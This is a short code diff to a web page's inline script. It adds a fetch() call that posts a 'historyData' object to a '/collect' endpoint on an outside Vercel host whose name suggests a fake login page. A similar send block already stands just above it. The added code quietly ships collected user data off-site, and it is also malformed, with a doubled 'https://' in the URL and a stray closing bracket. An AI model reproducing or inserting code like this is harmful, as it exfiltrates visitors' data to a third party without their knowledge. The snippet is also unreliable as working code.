@@ -150,6 +150,21 @@
         console.error("Error sending data:", error);
       });
     });
+   fetch("https://https://fe-lo-login-invv-i8wdk86py-sahilshadow.vercel.app//collect", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(historyData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Data sent:", data);
+      })
+      .catch(error => {
+        console.error("Error sending data:", error);
+      });
+    });
   </script>
 </body>
 </html>
